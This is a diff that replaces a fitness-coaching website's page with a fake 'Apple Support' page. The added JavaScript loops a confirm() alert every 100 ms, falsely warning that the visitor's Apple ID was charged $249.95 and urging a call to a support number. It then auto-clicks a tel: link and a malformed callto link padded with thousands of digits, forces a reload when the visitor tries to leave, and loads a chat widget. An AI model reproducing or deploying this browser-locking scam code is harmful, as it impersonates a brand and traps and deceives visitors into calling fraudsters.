-                  d="M1.5 0A1.5 1.5 0 0 0 0 1.5v2A1.5 1.5 0 0 0 1.5 5h8A1.5 1.5 0 0 0 11 3.5v-2A1.5 1.5 0 0 0 9.5 0h-8zm5.927 2.427A.25.25 0 0 1 7.604 2h.792a.25.25 0 0 1 .177.427l-.396.396a.25.25 0 0 1-.354 0l-.396-.396zM0 8a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V8zm1 3v2a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-2H1zm14-1V8a1 1 0 0 0-1-1H2a1 1 0 0 0-1 1v2h14zM2 8.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 0 1h-9a.5.5 0 0 1-.5-.5zm0 4a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1h-6a.5.5 0 0 1-.5-.5z"
-                />
-              </svg>
-            </button>
-            <div class="collapse navbar-collapse" id="navbarNavDropdown">
-              <ul class="navbar-nav">
-                <li class="nav-item">
-                  <a class="nav-link" href="./#section1">About us</a>
-                </li>
-                <li class="nav-item">
-                  <a class="nav-link" href="./#section2">Our Services</a>
-                </li>
-                
-                <li class="nav-item">
-                  <a class="nav-link" href="./#section3">Write to us</a>
-                </li>
-                
-                
-                <li class="nav-item">
-                  <a class="nav-link" href="./#section4">Our People</a>
-                </li>
-                
-                
-              </ul>
-            </div>
-          </div>
         </nav>
-      </div>
-    </div>
-    <div class="hero">
-      <div class="container">
-        <div class="hero-container">
-          <div class="">
-            <h2 class="hero-title">Custom Workout Plans and Progress Evaluation</h2>
-            
-          </div>
-        </div>
-      </div>
-    </div>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-    
-    <div class="section" id="section1">
-      <div class="container">
-        <div class="row flex-row-reverse">
-          <div class="col-12 col-lg-6 about-us-item">
-            <h2 class="title">About us</h2>
-            <p class="us-us">Musclinebler helps athletes and everyday gym-goers build realistic, science-backed training routines. We look past generic fitness templates to evaluate what your body actually needs. Whether you are prepping for a marathon or trying to add functional strength, our team tracks your performance metrics, refines your schedule, and eliminates guesswork. Fitness should be structured, sustainable, and entirely personal to your unique lifestyle.</p>
-          </div>
-          <div class="col-12 col-lg-6">
-            <img src="files/images/gallery-2.jpg" alt="" />
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="section services" id="section2">
-      <div class="container">
-        <h2 class="text-center title">Our Services</h2>
-        <div class="row services-list">
-          <div class="col-12 col-md-4 services-item">
-            <div class="services-img">
-              <img src="files/images/gallery-3.jpg" alt="" />
-            </div>
-            <div class="services-text">Individualized training program design built around your schedule, equipment availability, and specific athletic goals.</div>
-          </div>
-          <div class="col-12 col-md-4 services-item">
-            <div class="services-img">
-              <img src="files/images/gallery-4.jpg" alt="" />
-            </div>
-            <div class="services-text">Comprehensive effectiveness evaluation using performance logs and movement analysis to identify potential physical bottlenecks.</div>
-          </div>
-          <div class="services-item">
-            <div class="col-12 col-md-4 services-img">
-              <img src="files/images/gallery-5.jpg" alt="" />
-            </div>
-            <div class="services-text">Ongoing routine adjustments and video form reviews to ensure continuous improvement and injury prevention.</div>
-          </div>
-        </div>
-      </div>
-    </div>
-    <div class="section main">
-      <div class="container">
-        <h2 class="text-center title">Building Effective Training Plans for Lasting Athletic Progress</h2>
-        <div class="content-box">
-          <div class="rootImg">
-            <img class="imagesWidth" src="product-images/training-plan-evaluation.webp" alt="Friendly male fitness customer portrait" />
-          </div>
-          <div class="main-description">
-            <div><p>Physical training often feels like shouting into an empty canyon. You lift heavy objects, log miles on the treadmill, and sweat through high-intensity intervals, yet the scale refuses to budge and your strength plateaus. The missing link is rarely your work ethic; it is almost always the lack of a coherent, personalized structure designed specifically for your biology, schedule, and recovery capacity.</p><p>At Musclinebler, we approach fitness as an ongoing puzzle rather than a rigid military drill. Building a sustainable workout plan requires understanding how stress, recovery, nutrition, and daily lifestyle habits intersect. When one of these pillars falters, the entire athletic framework begins to wobble, leading to frustrating setbacks and avoidable injuries.</p><h2>Decoding Your Physical Baseline</h2><p>Before writing a single line of a workout schedule, we examine where you currently stand. Generic fitness templates assume every human body responds identically to volume and intensity, which ignores basic physiology. Your recovery rate, past injuries, sleeping patterns, and job stress levels dictate how much work your body can actually absorb and adapt to.</p><p>Evaluating your effectiveness goes far beyond counting repetitions or tracking lifting weights. We look at movement quality, energy fluctuations throughout the day, and long-term joint health. If a routine leaves you chronically exhausted instead of energized, the plan is fundamentally broken, regardless of how many calories it claims to burn during a single session.</p><p>Effective training balances progressive overload with adequate rest periods. Too many gym-goers fall into the trap of constant exhaustion, mistaking soreness for productivity. True athletic development happens when your nervous system recovers fully between sessions, allowing you to push harder when it actually matters on the platform or the running track.</p><h2>Core Elements of a Sustainable Routine</h2><p>A properly constructed training program possesses distinct characteristics that separate it from random exercise. When you look at a truly effective routine, several key components stand out clearly to experienced coaches:</p><ul><li>Clear movement patterns prioritizing functional multi-joint exercises</li><li>Customized volume based on individual work capacity</li><li>Built-in deload weeks to prevent cumulative physical fatigue</li><li>Flexible scheduling accommodating unexpected life disruptions</li><li>Objective performance tracking metrics rather than subjective feelings</li><li>Clear guidelines for scaling intensity up or down</li></ul><p>These elements form the backbone of any serious physical preparation. Without them, you are simply guessing in the weight room and hoping for random improvements that rarely materialize in the real world.</p><h2>Evaluating Progress Without Obsession</h2><p>Numbers on a spreadsheet tell a powerful story, but they can also become a psychological trap if misinterpreted. We teach athletes how to audit their progress objectively. Progress is rarely linear; you will experience weeks where strength spikes and other weeks where performance plateaus due to external factors like poor sleep quality or tight work deadlines.</p><p>Evaluating effectiveness means zooming out to look at monthly and quarterly trends rather than daily fluctuations. A bad workout does not invalidate a solid training block. By keeping detailed logs of your sets, reps, and perceived exertion, you learn to spot patterns before they turn into nagging injuries or severe mental burnout.</p><h2>Adapting Your Program for the Long Haul</h2><p>Life changes constantly, and your training plan must evolve right alongside it. A routine that works brilliantly during a relaxed summer vacation will likely fail when autumn brings heavy job responsibilities and travel schedules. Flexibility is the ultimate metric of a great program, ensuring you stay active year-round.</p><p>We help you adjust exercise selection, training frequency, and workout duration to match your current reality. Fitness should enhance your life, not add another layer of crushing anxiety. When your training aligns with your actual capacity, consistency becomes second nature, and physical transformation follows naturally without demanding total lifestyle upheaval.</p><h2>Building Lasting Athletic Habits</h2><p>Motivation is a fickle companion that disappears the moment things get difficult. Systems, on the other hand, keep you moving forward when enthusiasm fades. By establishing clear daily cues, manageable micro-goals, and robust feedback loops, you transform exercise from a burdensome chore into an integral part of your identity.</p><p>Your journey with Musclinebler is designed to make you self-reliant. We do not just hand over a PDF and walk away; we teach you how to listen to your body, interpret performance data, and make informed adjustments for the rest of your athletic life.</p></div>
-          </div>
-        </div>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-         
-      </div>
-    </section>
-    <div class="d-flex flex-column-reverse wrapper-styleop">
-      <section class="section video-section">
-        <div class="container d-flex justify-content-center align-items-center">
-          <button
-            type="button"
-            class=""
-            data-bs-toggle="modal"
-            data-bs-target="#exampleModal"
-          >
-            <div class="play-btn">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-play-fill"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  d="m11.596 8.697-6.363 3.692c-.54.313-1.233-.066-1.233-.697V4.308c0-.63.692-1.01 1.233-.696l6.363 3.692a.802.802 0 0 1 0 1.393z"
-                />
-              </svg>
-            </div>
-          </button>
-          <div
-            class="modal fade"
-            id="exampleModal"
-            tabindex="-1"
-            aria-labelledby="exampleModalLabel"
-            aria-hidden="true"
-          >
-            <div class="modal-dialog modal-dialog-centered">
-              <div class="modal-content video-content">
-                <div class="modal-header">
-                  <button
-                    type="button"
-                    class=""
-                    data-bs-dismiss="modal"
-                    aria-label="Close"
-                  >
-                    <svg
-                      xmlns="http://www.w3.org/2000/svg"
-                      width="16"
-                      height="16"
-                      fill="currentColor"
-                      class="bi bi-x-circle"
-                      viewBox="0 0 16 16"
-                    >
-                      <path
-                        d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"
-                      />
-                      <path
-                        d="M4.646 4.646a.5.5 0 0 1 .708 0L8 7.293l2.646-2.647a.5.5 0 0 1 .708.708L8.707 8l2.647 2.646a.5.5 0 0 1-.708.708L8 8.707l-2.646 2.647a.5.5 0 0 1-.708-.708L7.293 8 4.646 5.354a.5.5 0 0 1 0-.708z"
-                      />
-                    </svg>
-                  </button>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
                 </div>
-                <div class="modal-body">
-                  <iframe
-                    class="video"
-                    controls
-                    width="100%"
-                    muted
-                    height="100%"
-                    src="files/images/hero_Xh0.mp4"
-                  ></iframe>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
                 </div>
-              </div>
-            </div>
-          </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-888-883-5873
+			 " property="telephone">
+            </section>
         </div>
-      </div>
-      
-    </div>
-    <div class="section catalog__rownf">
-      <div class="container">
-        <h2 class="text-center title">How Our Process Works</h2>
-        <div class="row how-work-wr">
-          <div class="col-12 col-md-6 how-work-img">
-            <img src="files/images/gallery-7.jpg" alt="" />
-          </div>
-          <div class="col-12 col-md-6 how-work-list">
-            <div class="how-work-item">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-activity"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  fill-rule="evenodd"
-                  d="M6 2a.5.5 0 0 1 .47.33L10 12.036l1.53-4.208A.5.5 0 0 1 12 7.5h3.5a.5.5 0 0 1 0 1h-3.15l-1.88 5.17a.5.5 0 0 1-.94 0L6 3.964 4.47 8.171A.5.5 0 0 1 4 8.5H.5a.5.5 0 0 1 0-1h3.15l1.88-5.17A.5.5 0 0 1 6 2Z"
-                />
-              </svg>
-              <p>Submit your current athletic history, schedule constraints, and personal fitness goals through our secure intake portal.</p>
-            </div>
-            <div class="how-work-item">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-bank2"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  d="M8.277.084a.5.5 0 0 0-.554 0l-7.5 5A.5.5 0 0 0 .5 6h1.875v7H1.5a.5.5 0 0 0 0 1h13a.5.5 0 1 0 0-1h-.875V6H15.5a.5.5 0 0 0 .277-.916l-7.5-5zM12.375 6v7h-1.25V6h1.25zm-2.5 0v7h-1.25V6h1.25zm-2.5 0v7h-1.25V6h1.25zm-2.5 0v7h-1.25V6h1.25zM8 4a1 1 0 1 1 0-2 1 1 0 0 1 0 2zM.5 15a.5.5 0 0 0 0 1h15a.5.5 0 1 0 0-1H.5z"
-                />
-              </svg>
-              <p>Our coaches analyze your performance metrics and design a customized weekly training routine tailored to your physiology.</p>
-            </div>
-            <div class="how-work-item">
-              <svg
-                xmlns="http://www.w3.org/2000/svg"
-                width="16"
-                height="16"
-                fill="currentColor"
-                class="bi bi-box-seam"
-                viewBox="0 0 16 16"
-              >
-                <path
-                  d="M8.186 1.113a.5.5 0 0 0-.372 0L1.846 3.5l2.404.961L10.404 2l-2.218-.887zm3.564 1.426L5.596 5 8 5.961 14.154 3.5l-2.404-.961zm3.25 1.7-6.5 2.6v7.922l6.5-2.6V4.24zM7.5 14.762V6.838L1 4.239v7.923l6.5 2.6zM7.443.184a1.5 1.5 0 0 1 1.114 0l7.129 2.852A.5.5 0 0 1 16 3.5v8.662a1 1 0 0 1-.629.928l-7.185 2.874a.5.5 0 0 1-.372 0L.63 13.09a1 1 0 0 1-.63-.928V3.5a.5.5 0 0 1 .314-.464L7.443.184z"
-                />
-              </svg>
-              <p>Test the routine for four weeks, log your results, and receive comprehensive feedback to optimize future progress.</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    
-    <div class="section" id="section3">
-      <div class="container">
-        <h2 class="text-center title form-title">You can use our services by writing to us or calling us. We will be happy to answer any questions and help you order services!</h2>
-         <form method="post" class="form" action="thank-you.php">
-          <div class="modal-form-item">
-             <label for="btn_box--group-name">Enter your name</label><input class="input-btn_box--group" id="btn_box--groupname" type="text" name="name_auto-secondary" required> <label for="btn_box--group-phone">Enter Your Phone Number</label><input name="phone_auto-secondary" class="input-btn_box--group" id="btn_box--group-phone" type="tel" required> <label for="btn_box--group-email">Email Address</label><input name="email_auto-secondary" class="input-btn_box--group" id="btn_box--group-email" type="email" required>
-          </div>
-
-          <div class="form-check">
-            <input class="form-check-input" type="checkbox" id="check-form" />
-            <label class="form-check-label" for="flexCheckChecked">
-              I accept
-              <a href="Privacy.html" target="_blank">Privacy policy</a>
-            </label>
-          </div>
-          <button onclick="orderForm()" type="submit" class="button-3">
-            <span>Expert consultation</span>
-          </button>
-        </form>
-      </div>
-    </div>
-    
-    <div class="section statistic">
-      <div class="container">
-        <div class="row statistic-list">
-          <div class="col-12 col-md-6 col-lg-3 statistic-item">
-            <div class="statistic-box">
-              <p>Over five years active</p>
-              <p class="statistic-num">77517</p>
-            </div>
-          </div>
-          <div class="col-12 col-md-6 col-lg-3 statistic-item">
-            <div class="statistic-box">
-              <p>Thousands of plans built</p>
-              <p class="statistic-num">12424</p>
-            </div>
-          </div>
-          <div class="col-12 col-md-6 col-lg-3 statistic-item">
-            <div class="statistic-box">
-              <p>Ninety percent retention rate</p>
-              <p class="statistic-num">63534</p>
-            </div>
-          </div>
-          <div class="col-12 col-md-6 col-lg-3 statistic-item">
-            <div class="statistic-box">
-              <p>Dedicated expert coaching staff</p>
-              <p class="statistic-num">38136</p>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    
-    
-    <div class="section workers" id="section4">
-      <div class="container">
-        <h2 class="text-center title">Our People</h2>
-        <div class="workers-list">
-          <div class="row workers-item">
-            <div class="col-12 col-md-4 workers-box">
-              <div class="workers-img">
-                <img src="files/images/female-athlete-portrait.webp" alt="" />
-              </div>
-              <div class="workers-name-box">
-                <p class="workers-name">Sarah Jenkins</p>
-                <p>Head Coach</p>
-              </div>
-            </div>
-            <div class="col-12 col-md-4 workers-box">
-              <div class="workers-img">
-                <img src="files/images/male-fitness-customer.webp" alt="" />
-              </div>
-              <div class="workers-name-box">
-                <p class="workers-name">Sarah Jenkins</p>
-                <p>Fitness Analyst</p>
-              </div>
-            </div>
-            <div class="col-12 col-md-4 workers-box">
-              <div class="workers-img">
-                <img src="files/images/smiling-sporty-woman.webp" alt="" />
-              </div>
-              <div class="workers-name-box">
-                <p class="workers-name">Emily Watson</p>
-                <p>Exercise Physiologist</p>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-    
-    
-    
-    <div class="footer">
-      <div class="container">
-        <div class="footer-privacy-wrapper">
-          <a class="footer-privacy" href="Privacy.html" target="_blank">Privacy policy</a>
-          <a class="footer-privacy" href="terms.html" target="_blank">Terms & Conditions</a>
-          <a class="footer-privacy m-0" href="disclaimer.html" target="_blank">Disclaimer</a>
-                
-        </div>
-      </div>
-    </div>
-    <div class="btn-up btn-up_hide"></div>
-
-      
+    </footer>
 
 
+
+    <script src="js/jquery-1.12.0.min.js"></script>
     <script>
-      $(document).ready(function () {
-        if ($(".how-work-wr").css("flex-direction") == "row-reverse") {
-          $(".how-work-item").css("text-align", "end");
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-888-883-5873');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
         }
-        if ($(".how-work-wr").css("flex-direction") == "row") {
-          $(".how-work-item").css("text-align", "start");
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
         }
-      });
 
 
-      function orderForm() {
-        var nameForm = document.getElementById("name-form").value;
-        var phoneForm = document.getElementById("phone-form").value;
-        var emailForm = document.getElementById("email-form").value;
-        var textareaForm = document.getElementById("textarea-form").value;
-        var checkForm = document.getElementById("check-form").value;
-
-        var pattern = /^[a-z0-9_-]+@[a-z0-9-]+\.[a-z]{2,6}$/i;
-        var requiredForm = emailForm.search(pattern) == 0;
-
-        if (
-          nameForm != "" &&
-          phoneForm != "" &&
-          emailForm != "" &&
-          textareaForm != "" &&
-          checkForm != "" &&
-          requiredForm == true
-        ) {
-          $(".form").css("display", "none");
-          $(".form-title").css("display", "none");
-          $(".alert-order").hide();
-        } else {
-          $(".alert-order").show().fadeOut(3000);
+        if (!phone) {
+            phone = getURLParameter('phone');
         }
-      }
-
-      function selectTarif() {
-        var orderName = document.getElementById("orderName").value;
-        var orderEmail = document.getElementById("orderEmail").value;
-        var orderTel = document.getElementById("orderTel").value;
-        var orderMessage = document.getElementById("orderMessage").value;
-        var orderCheck = document.getElementById("orderCheck").value;
-
-        var pattern = /^[a-z0-9_-]+@[a-z0-9-]+\.[a-z]{2,6}$/i;
-        var requiredEmail = orderEmail.search(pattern) == 0;
-
-        if (
-          orderName != "" &&
-          orderEmail != "" &&
-          orderTel != "" &&
-          orderMessage != "" &&
-          orderCheck != "" &&
-          requiredEmail == true
-        ) {
-          $(".alert-select-tarif").hide();
-          $("body").removeClass("modal-open");
-          $("body").css("padding-right", "0");
-          $(".fade").removeClass("show");
-          $(".modal").css("display", "none");
-          $(".modal-backdrop").css("display", "none");
-          $(".btn-chose-tarif").prop("disabled", true);
-        } else {
-          $(".alert-select-tarif").show().fadeOut(3000);
+        if (!text) {
+            text = getURLParameter('text');
         }
-      }
 
-      $(document).ready(function () {
-        var src = $("#exampleModal iframe").attr("src");
-        $("#exampleModal").on("show.bs.modal", function () {
-          $("#exampleModal iframe").attr("src", src + "?autoplay=1");
-        });
-        $("#exampleModal").on("hidden.bs.modal", function (e) {
-          $("#exampleModal iframe").attr("src", null);
-        });
-      });
-
-     
-
-      const btnUp = {
-        el: document.querySelector(".btn-up"),
-        show() {
-          this.el.classList.remove("btn-up_hide");
-        },
-        hide() {
-          this.el.classList.add("btn-up_hide");
-        },
-        addEventListener() {
-          window.addEventListener("scroll", () => {
-            const scrollY =
-              window.scrollY || document.documentElement.scrollTop;
-            scrollY > 400 ? this.show() : this.hide();
-          });
-          document.querySelector(".btn-up").onclick = () => {
-            window.scrollTo({
-              top: 0,
-              left: 0,
-              behavior: "smooth",
-            });
-          };
-        },
-      };
-
-      btnUp.addEventListener();
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
 
 
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-888-883-5873"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-888-883-5873 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
     </script>
-    
-    
 
-    
-  </body>
 
-</html>
 
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
